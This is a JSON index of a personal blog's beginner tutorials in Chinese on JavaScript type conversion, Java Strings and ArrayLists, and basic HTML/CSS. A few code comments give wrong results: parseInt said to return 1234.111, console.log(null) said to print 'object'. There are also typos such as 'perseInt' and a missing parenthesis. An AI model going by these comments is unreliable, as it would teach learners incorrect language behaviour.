\"\";console.log(Boolean(a));//trueconsole.log(Boolean(b);//falseconsole.log(Boolean(c));//falseconsole.log(Boolean(d));//falseconsole.log(Boolean(null));//falseconsole.log(Boolean(undefined));//false","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"其他进制的数字","slug":"JS00013其他进制的数字","date":"2020-02-17T08:33:11.000Z","updated":"2020-02-17T08:57:07.851Z","comments":true,"path":"2020/02/17/JS00013其他进制的数字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00013其他进制的数字/","excerpt":"","text":"其他进制的数字 在JS中,如果需要表示16进制的数字,则需要以0x开头. 12var a = 0x12334;console.log(a); 如果需要表示8进制,则用0开头 12var a = 010;console.log(a); 如果需要表示二进制,用0b开头.但不是所有浏览器都支持. 12var a = 0b010;console.log(a); 有些浏览器会把&quot;070&quot;这种字符串当成10进制 1234var a = \"070\";parseInt(a);//有些浏览器会把这种字符串当成10进制//解决方法parseInt(a,8);","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-Number","slug":"JS00012强制类型转换Number","date":"2020-02-17T07:48:04.000Z","updated":"2020-03-01T10:13:13.981Z","comments":true,"path":"2020/02/17/JS00012强制类型转换Number/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00012强制类型转换Number/","excerpt":"","text":"强制类型转换-Number 将其他数据类型转换为Number 字符串----&gt;数字 转换方式一: 使用Number()函数; Number(变量) 1.如果是纯数字的字符串,则直接将其转换为数字 2.如果是字符串中有非数字的内容,则转换为NaN 3.如果字符串是一个空串或者是一个全空格的字符串,则转换为0 4.布尔类型转Number,true会转换为1,false转换为0 5.null ----&gt; 数字0 6.Undefined —&gt; 数字:NaN 转换方式二: 这种方式专门用来转换字符串 parseInt()把一个字符串转换为一个整数. parseInt()可以将一个字符串中的有效的整数内容取出来. 12var a = \"1234px\";var b = parseInt(a);//1234 parseFloat()把一个字符串转换为一个浮点数. 12var a = \"1234.111px\";var b = parseInt(a);//1234.111 如果对非String使用parseInt()或parseFloat(),他会先将其转换为String,然后在操作 12var a = true;var b = perseInt(true);//返回NaN 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //Number() var a = \"123\"; a = Number(a); console.log(a); //123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);// 0 //parseInt() || parseFloat(); console.log(\"=========================\"); var a = \"123a\"; a = parseInt(a); console.log(a);//123 var a = \"123\"; a = Number(a); console.log(a);//123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);//0 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-String","slug":"JS00011强制类型转换-String","date":"2020-02-17T07:30:25.000Z","updated":"2020-02-17T07:48:42.013Z","comments":true,"path":"2020/02/17/JS00011强制类型转换-String/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00011强制类型转换-String/","excerpt":"","text":"强制类型转换-String 强制转换类型是指将一个数据类型强制转换为其他的数据类型 类型转换主要指,将其他的数据类型,转换为 String Number Boolean 方式一: 调用被转换数据类型的toString()方法 例如 : a.toString() 该方法不会影响到原变量,他会将转换结果返回. 注意: 如果将null和Undefined这两个值用转换toString()方法就会出错 方式二 调用String()函数,并将转换的数据作为参数传递函数 例如:String(123);----String(123); 使用String();函数做强制转换时: 对于Number和Boolean实际上就是调用toString()方法 但是对于null和undefined,就不会调用toString()方法 他会将null直接转换为&quot;null&quot; 将Undefined直接转换为&quot;Undefined&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var str = 123; console.log(str.toString()); //// str = null; 出错// console.log(str.toString());// str = undefined;出错// console.log(str.toString()); str = 123.3; console.log(str.toString()); str = true; console.log(str.toString()); str = 1231; str = String(str); console.log(str); console.log(\"=================\"); str = 123.2; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = undefined; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = true; str = String(str); console.log(str); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"字符串的获取相关方法","slug":"java00056字符串的获取相关方法","date":"2020-02-16T17:44:12.000Z","updated":"2020-02-16T18:01:08.023Z","comments":true,"path":"2020/02/17/java00056字符串的获取相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00056字符串的获取相关方法/","excerpt":"","text":"字符串的获取相关方法 常用方法有: public int lenght(); 获取字符串长度 public String concat(String str);拼接两个字符串 public char charAt(int index);返回指定索引的字符 public int indexOf(String str);查找子字符串出现在本字符串的首字符索引值,如果没有则返回-1 1234567891011121314151617181920public class demo09&#123; public static void main(String[] args) &#123; String str = new String(\"abc\"); String str1; int len = 0; int index = 0; char ch; len = str.length();//获取字符串长度 ch = str.charAt(0);//获取str的第0个索引的字符 str1 = str.concat(\"def\");//拼接两个字符串 index = str.indexOf(\"ab\");//查找子字符串第一次出现的索引值 System.out.println(\"字符串长度:\" + len); System.out.println(\"第0个字符是:\" + ch); System.out.println(\"拼接字符:\" + str1); System.out.println(\"字符串出现的\" + index); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的比较方法","slug":"java00055字符串的比较方法","date":"2020-02-16T17:14:16.000Z","updated":"2020-02-16T17:42:58.762Z","comments":true,"path":"2020/02/17/java00055字符串的比较方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00055字符串的比较方法/","excerpt":"","text":"字符串的比较方法 想让两个字符串进行比较,就用: public boolean equals(Object obj);方法,区分大小写 public boolean equalsIgnoreCase(Object obj);不区分字母大小写 参数可以是任何对象,只有参数是一个字符串并且内容相同的才会返回一个true,否者返回false. 1.任何对象都可以用Object来接收. 2.equals方法具有对称性,也就是a.equals(b)和b.equals(a)是一样的 3.如果比较两个字符串一个是字符串常量,另一个是字符串变量,推荐把字符串常量写在前面. 推荐: &quot;zzz&quot;.equals(str); 不推荐 abc.equals(&quot;zzz&quot;); 因为如果abc是一个null又调用equals()就会抛出异常. 如果是zzz.equals(str)则会返回一个false; 12345678910111213public class demo08&#123; public static void main(String[] args) &#123; String str1 = new String(\"123\"); String str2 = new String(\"123\"); String str3 = new String(\"456\"); System.out.println(str1.equals(str2));//true System.out.println(str1.equals(str3));//false System.out.println(\"ABC\".equalsIgnoreCase(\"abc\"));//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的常量池","slug":"java00054字符串的常量池","date":"2020-02-16T16:51:33.000Z","updated":"2020-02-16T17:24:17.046Z","comments":true,"path":"2020/02/17/java00054字符串的常量池/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00054字符串的常量池/","excerpt":"","text":"字符串的常量池 字符串常量池:程序当中直接写上的双引号字符串,就在字符串常量池中. 对于基本类型来说, == 是用来进行数值比较的. 对于引用类型来说,== 是进行地址值的比较. String引用声明出来的字符串是不能直接修改的,修改的只是是地址值.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的构造和直接创建","slug":"java00053字符串的构造和直接创建","date":"2020-02-15T14:01:21.000Z","updated":"2020-02-15T14:20:47.169Z","comments":true,"path":"2020/02/15/java00053字符串的构造和直接创建/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00053字符串的构造和直接创建/","excerpt":"","text":"字符串的构造和直接创建 创建字符串的常见3+1种方式. 三种构造方法: 1.创建一个空白字符串,不含有任何内容. public String(); 2.根据字符数组的内容,来创建对应的字符串. public String(char[] array); 3.根据字节数组的内容,来创建对应的字符串. public String(byte[] array); 一种直接创建: String str = &quot;abc&quot;; //右边直接用双引号 注意: 直接写上双引号,就是字符串对象了 123456789101112131415161718192021222324public class demo06&#123; public static void main(String[] args) &#123; //直接创建 String str1 = \"qqqqq\"; //创建一个空白字符串 String str2 = new String(); //根据字符数组创建 char[] charv = &#123;'w','w','w','w'&#125;; String str3 = new String(charv); //根据byte数组创建 byte[] bt = &#123;(int)'a',65,67,77,69&#125;; String str4 = new String(bt); System.out.println(str1); System.out.println(str2); System.out.println(str3); System.out.println(str4); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串概述和特点","slug":"java00052字符串概述和特点","date":"2020-02-15T13:53:47.000Z","updated":"2020-02-15T14:00:14.121Z","comments":true,"path":"2020/02/15/java00052字符串概述和特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00052字符串概述和特点/","excerpt":"","text":"字符串概述和特点 字符串概述 java.lang.String类代表字符串 API当中说,Java程序中所有的字符串字面值(如 “abcd”) 都作为此类的实例实现. 其实就是说:程序当中所有的双引号字符串,都是String类的对象.(就算没有 nwe,也照样是.) 字符串的特点 1.字符串的内容永不可变.【重点】 2.因为字符串不可以改变，所以字符串是可以共享使用的。 3.字符串效果上相当于是char[]字符数组，但是底层原理是byte[]字节数组.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数返回类型","slug":"java00051用ArrayList类型做函数返回类型","date":"2020-02-15T13:44:45.000Z","updated":"2020-02-15T13:51:01.494Z","comments":true,"path":"2020/02/15/java00051用ArrayList类型做函数返回类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00051用ArrayList类型做函数返回类型/","excerpt":"","text":"用ArrayList类型做函数返回类型 格式: public static ArrayList&lt;引用类型&gt; 函数名(类型名 变量名 ) 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.Random;/*随机存储20位数到ArrayList中,通过函数调用筛选偶数出来,并存储在一个集合中,然后返回一个只装有偶数的集合.*/public class demo05&#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; smallList; Random r = new Random(); for (int i = 0; i &lt; 20; i++) &#123; intList.add(r.nextInt(1000)); &#125; smallList = isOuShu(intList); System.out.println(\"偶数总个数: \" + smallList.size()); System.out.println(smallList); &#125; //用 ArrayList&lt;Integer&gt;做函数返回类型 public static ArrayList&lt;Integer&gt; isOuShu(ArrayList&lt;Integer&gt; intList) &#123; ArrayList&lt;Integer&gt; smallList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; intList.size(); i++) &#123; int num = intList.get(i); if(num % 2 == 0) &#123; smallList.add(num); &#125; &#125; return smallList; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数参数","slug":"java00050用ArrayList类型做函数参数","date":"2020-02-15T13:29:09.000Z","updated":"2020-02-15T13:46:00.025Z","comments":true,"path":"2020/02/15/java00050用ArrayList类型做函数参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00050用ArrayList类型做函数参数/","excerpt":"","text":"用ArrayList类型做函数参数 格式: public static 返回值类型 函数名(ArrayList&lt;引用类型&gt; 变量名 ) 1234567891011121314151617181920212223242526272829import java.util.ArrayList;public class demo04&#123; public static void main(String[] args) &#123; ArrayList&lt;Student&gt; std = new ArrayList&lt;&gt;(); std.add(new Student(\"张三丰\",99)); std.add(new Student(\"张无忌\",19)); std.add(new Student(\"宋远桥\",39)); std.add(new Student(\"张翠山\",44)); printArrayList(std); &#125; //用ArrayList&lt;Student&gt;做函数参数,传递过来的是一个引用的地址 public static void printArrayList(ArrayList&lt;Student&gt; std)&#123; System.out.print(\"&#123;\"); for (int i = 0; i &lt; std.size(); i++) &#123; if(i == std.size() - 1) &#123; System.out.print(std.get(i).getName() + \"&#125;\"); &#125;else&#123; System.out.print(std.get(i).getName() + \"@\"); &#125; &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829public class Student&#123; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public Student() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合存储基本数据","slug":"java00049ArrayList集合存储基本数据","date":"2020-02-15T13:10:36.000Z","updated":"2020-02-15T13:25:16.632Z","comments":true,"path":"2020/02/15/java00049ArrayList集合存储基本数据/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00049ArrayList集合存储基本数据/","excerpt":"","text":"ArrayList集合存储基本数据 泛型只能是引用类型,不能是基本类型 如果希望向集合ArrayList当中存储基本类型对应的&quot;包装类&quot;。 基本类型 包装类(引用类型,包装类都位于java.lang包下) byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean 从JDK 1.5+开始,支持自动装箱和自动拆箱 自动装箱:基本类型自动转换到包装类型 自动拆箱:包装类型自动转换到基本类型 使用格式: ArrayList&lt;Integer&gt; intVal = new ArrayList&lt;&gt;(); 12345678910111213141516171819import java.util.ArrayList;import java.util.List;import java.util.Scanner;public class demo01&#123; public static void main(String[] args) &#123; //使用包装类 ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); Scanner sc = new Scanner(System.in); //向列表加入元素 intList.add(888); intList.add(89); intList.add(sc.nextInt()); //输出列表 System.out.println(intList); System.out.println(intList.get(1)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"图片的格式","slug":"html-css00010图片的格式","date":"2020-02-15T03:21:22.000Z","updated":"2020-02-15T03:43:08.487Z","comments":true,"path":"2020/02/15/html-css00010图片的格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00010图片的格式/","excerpt":"","text":"图片的格式 常用的图片格式有三种,分别是：JPG、GIF、PNG. JPEG(JPG) JPEG图片支持的颜色比较多,图片可以压缩,但是不支持透明 一般使用JPEG来保存颜色比较丰富的图片. GIF GIF支持的颜色少,只支持简单的透明,支持动态图 图片颜色单一或者是动态图时可以使用gif PNG PNG支持的颜色多,并且支持复杂的透明 可以用来显示颜色复杂的透明的图片 图片的使用原则 效果不一致,使用效果好的. 效果一致,使用内存小的.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"相对路径","slug":"html-css00009相对路径","date":"2020-02-15T03:05:21.000Z","updated":"2020-02-15T03:52:44.737Z","comments":true,"path":"2020/02/15/html-css00009相对路径/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00009相对路径/","excerpt":"","text":"相对路径 src属性配置的是图片的路径,目前我们所要使用的路径全都是相对路径. 相对路径: 相对路径指相对于当前资源所在目录的位置. 当前文件目录的文件直接写文件名 &lt;img src=&quot;1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 可以使用../来返回上一级目录. &lt;img src=&quot;../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回上上级目录. &lt;img src=&quot;../../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回几级目录就用几个../ 当前文件的下一级目录. &lt;img src=&quot;abc/123.jpg&quot; alt=&quot;老师&quot;&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"图片标签","slug":"html-css00008图片标签","date":"2020-02-15T02:28:07.000Z","updated":"2020-02-15T02:45:34.126Z","comments":true,"path":"2020/02/15/html-css00008图片标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00008图片标签/","excerpt":"","text":"图片标签 使用img标签来向网页中引入一个外部图片. img标签也是一个自结束标签 属性 src: 设置一个外部图片的路径 &lt;img src=&quot;图片路径&quot; /&gt; alt: &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; /&gt; 1.可以用来设置在图片不能显示时,对图片的描述 2.搜索引擎可以通过alt属性来识别不同的图片. 3如果不写alt属性,则搜索引擎不会对img中的图片进行收录 width:可以用来修改图片宽度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; width=&quot;100px&quot;/&gt; height:可以用来修改图片的高度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; height=&quot;100px&quot; /&gt; 注意: 1.如果宽度和高度两个属性只设置一个,另一个也会同时等比例调整大小. 2.如果两个值同时指定,则按照你指定的值来设置. 3.一般开发中除了自适应的页面,不建议设置width和height.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"实体","slug":"html-css00007实体","date":"2020-02-15T02:15:49.000Z","updated":"2020-02-15T02:26:21.630Z","comments":true,"path":"2020/02/15/html-css00007实体/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00007实体/","excerpt":"","text":"实体 在HTML中,一些如&lt;&gt;这种特殊字符是不能直接使用的,需要使用一些特殊的符号来表示这些特殊字符,这些特殊符号,我们称为实体(转义字符). 浏览器解析到实体时,会自动将实体转换为对应的字符. 实体语法 &amp;实体名字; &lt; 对应的实体是:&amp;lt; &gt;对应的实体是:&amp;gt; 空格实体: &amp;nbsp; 版权符号:&amp;copy; tab制表符实体: &amp;emsp; 其余的可以去查看一些官方的手册.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"常用的标签","slug":"html-css00006常用的标签","date":"2020-02-14T13:59:23.000Z","updated":"2020-02-15T01:05:16.646Z","comments":true,"path":"2020/02/14/html-css00006常用的标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00006常用的标签/","excerpt":"","text":"常用的标签 标签 HTML中的标记指的就是标签. HTML使用标记标签来描述网页 结构: &lt;标签名&gt; 标签内容 &lt;/标签名&gt; &lt;标签名 /&gt; 元素: 元素和标签都是等价的,说白了元素就是标签… 但我们也可以理解成一个完整的标签称为元素. 如上面的结构所述的就是完整的标签 例如:&lt;h1&gt;我是一个完整的元素&lt;/h1&gt; 属性: 可以为HTML标签设置属性 通过属性为HTML元素提供附加信息 属性需要设置在开始标签或自结束标签中 属性总是以名称/值对的形式出现的 比如:name =&quot;value&quot; &lt;img src=&quot;&quot; alt=&quot;&quot; /&gt; 标题标签 在HTML中一共有6级标题标签 h1~h6,其中h1最大,h6最小 使用html标签时,关心的是标签的语义,我们使用的标签都是语义化标签. 6级标题中,h1的最重要,h1的重要性仅次于title,搜索引擎检索完title之后,会立即查看h1中的内容 h1标签非常重要,他会影响到页面在搜索引擎中的排名,页面只能写一个h1 一般页面中标题标签只使用h1~h3标题标签,h3以后的基本不使用 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;我是1级标签&lt;/h1&gt; &lt;h2&gt;我是2级标签&lt;/h2&gt; &lt;h3&gt;我是3级标签&lt;/h3&gt; &lt;h4&gt;我是4级标签&lt;/h4&gt; &lt;h5&gt;我是5级标签&lt;/h5&gt; &lt;h6&gt;我是6级标签&lt;/h6&gt; &lt;/body&gt;&lt;/html&gt; 段落标签 段落标签,段落标签用于表示内容中的一个自然段 使用p标签来表示一个段落 p标签中的文字,默认会独占一行,并且段与段之间会有一个间距 &lt;p&gt;我是一个段落标签,用来表示一个自然段.&lt;/p&gt; 在HTML中,字符之间写再多的空格,浏览器也会当成一个空格解析,换行也会当成一个空格解析 &lt;br&gt;换行标签 在页面中使用br标签来表示一个换行,br标签是一个自结束标签. &lt;br /&gt; &lt;hr&gt;水平标签 hr也是一个自结束标签,可以在页面中生成一条水平线. &lt;hr /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"乱码问题","slug":"html-css00005乱码问题","date":"2020-02-14T13:08:01.000Z","updated":"2020-02-14T13:26:46.712Z","comments":true,"path":"2020/02/14/html-css00005乱码问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00005乱码问题/","excerpt":"","text":"乱码问题 编码: 依据一定的规则,将字符转换为二进制编码的过程称之为编码. 解码: 依据一定的规则,将二进制编码转换为字符的过程称之为解码. 字符集: 编码和解码所采用的规则,我们称之为字符集 常见字符集: 1.ASCII 2.ISO-8859-1 3.GBK 4.GB2312 中文系统默认编码 5.UTF-8 万国码,支持地球上所有的文字 乱码原因: 产生乱码的根本原因是,编码和解码所采用的字符集不同 在中文系统的浏览器中,默认都是使用GB2312进行解码的 解决: 用&lt;meta charset=&quot;字符集&quot; /&gt;标签告诉浏览器网页所采用的编码字符集 meta标签用来设置网页的一些元数据,比如网页的字符集,关键字,简介等… meta是一个自结束标签,编写一个自结束标签时,可以在开始标签中添加一个 / ANSI ANSI代表智能字符集,会跟随操作系统默认选择的字符集 例如中文操作系统默认的字符集是GB2312 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;!--告诉浏览器,使用UTF-8进行解码 --&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS文档声明","slug":"html-css00004文档声明","date":"2020-02-14T12:17:28.000Z","updated":"2020-02-14T13:07:30.471Z","comments":true,"path":"2020/02/14/html-css00004文档声明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00004文档声明/","excerpt":"","text":"JS文档声明 我们需要告诉浏览器我们编写的html是使用哪个版本的 HTML5版本的文档声明很简单,只需要在顶部添加&lt;!DOCTYPE html&gt;既可. 注意事项 如果不添加文档声明,则会导致有些浏览器会进入一个怪异模式,进入怪异模式以后,浏览器解析页面会导致页面无法正常显示,所以为了避免进入该模式,一定要写文档声明 12345678910&lt;!--我是文档声明--&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Null和Undefined","slug":"JS00010Null和Undefined","date":"2020-02-14T01:22:09.000Z","updated":"2020-02-14T04:39:21.635Z","comments":true,"path":"2020/02/14/JS00010Null和Undefined/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00010Null和Undefined/","excerpt":"","text":"Null和Undefined Null(空值)类型只有一个值,就是null null这个值专门用来表示一个为空的对象 使用typeof检查一个null值时,会返回object Undefined(未定义)类型的值只有一个,就Undefined 当声明一个变量,但未初始化时,他的值就是Undefined 使用typeof检查一个Undefined值时,也会返回一个undefined 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //定义一个空类型变量,和一个Undefined变量 var a = null; var b; console.log(a); // 输出object console.log(b); // 输出undefined //输出object console.log(typeof a); //输出 undefined console.log(typeof b); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[{"name":"Null和Undefined","slug":"Null和Undefined","permalink":"https://xiaowuyoucy.github.io/tags/Null和Undefined/"}]},{"title":"JS_Boolean类型","slug":"JS00009-Boolean值类型","date":"2020-02-14T01:12:57.000Z","updated":"2020-02-14T04:39:14.528Z","comments":true,"path":"2020/02/14/JS00009-Boolean值类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00009-Boolean值类型/","excerpt":"","text":"JS_Boolean类型 Boolean布尔值 布尔值有两个,主要用来做逻辑判断 true 表示真 false 表示假 使用typeof检查一个布尔值时,会返回一个boolean 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; var isBingo = false; console.log(typeof false); console.log(typeof true); console.log(isBingo); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS_Number类型","slug":"JS00008-Number类型","date":"2020-02-14T00:29:49.000Z","updated":"2020-02-14T04:39:08.846Z","comments":true,"path":"2020/02/14/JS00008-Number类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00008-Number类型/","excerpt":"","text":"JS_Number类型 基本概念及使用 在JS中所有的数值都是Number类型,包括整数和浮点数 可以使用一个运算符typeof来检查变量类型,使用格式typeof 变量名会返回一个变量类型的字符串 JS中可以表示的数值的最大值是:Number.MAX_VALUE JS中可以表示大于0的最小值Number.MIN_VALUE 如果使用Number类型的变量超过了Number.MAX_VALUE则会返回一个Infinity,表示正无穷. Infinity表示正无穷 -Infinity表示符无穷 使用typeof检查Infinity也会返回Number NaN是一个特殊的数字,表示Not A Number 用typeof检查NaN时也会返回number 精度: 在JS中整数的基本运算可以保证精确的. 如果使用JS进行浮点运算,可能会得到一个不精确的结果 所以不要使用JS进行对精确度要求比较高的运算 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个整型变量和浮点型变量 var intNumber = 100; var floatNumber = 1.23; //在控制台输出两个变量的值 console.log(intNumber); console.log(floatNumber); //在控制台输出两个变量的类型 console.log(typeof intNumber); console.log(typeof floatNumber); //在控制台输出最大数值和&gt;0的最大数值 console.log(Number.MAX_VALUE); console.log(Number.MIN_VALUE); //超过最大值会返回一个Infinity var a = Number.MAX_VALUE; console.log(a * a); console.log(Number.MIN_VALUE * 1 / 2); //Infinity也是属于Number类型 console.log(typeof Infinity); //会返回一个NaN,表示不是一个数字 console.log(\"basd\" * \"abad\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字符串","slug":"JS00007字符串","date":"2020-02-13T23:57:44.000Z","updated":"2020-02-14T04:39:04.728Z","comments":true,"path":"2020/02/14/JS00007字符串/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00007字符串/","excerpt":"","text":"JS字符串数据 数据类型: 在JS中一共有六种数据类型 String: 字符串类型 Number: 数值类型 Boolean: 布尔类型 Null: 空值 Undefined: 未定义 Object: 对象类型 其中String,Number,Boolean,Null,Undefined属于基本数据类型 而Object属于引用数据类型. String字符串 在JS中字符串需要使用引号引起来,例如&quot;abc&quot; 使用双引号和单引号都可以,但是不能混用,例如&quot; abc ' 这样是错误的. 引号不能嵌套,双引号不能放在双引号中,单引号也不能放在单引号中 在字符串中我们可以使用\\作为转义字符. 输出两个双引号可以用两个单引号引起来:' &quot;abc&quot; ' 当表示一些特殊字符时可以使用\\进行转义,例如: \\n 表示换行符 \\t 表示一个制表符 \\\\ 表示\\ \\’ 表示’ \\&quot; 表示&quot; 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明字符串变量 var str = \"abcd\"; //使用用单引号输出双引号 var str1 = '\"1234\"'; //使用转义字符 var str2 = \"\\'qqqqqqq\\'\"; console.log(str); console.log(typeof str); console.log(str1) console.log(typeof str1); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS标识符","slug":"JS00006标识符","date":"2020-02-13T23:44:01.000Z","updated":"2020-02-14T04:38:59.770Z","comments":true,"path":"2020/02/14/JS00006标识符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00006标识符/","excerpt":"","text":"JS标识符 标识符 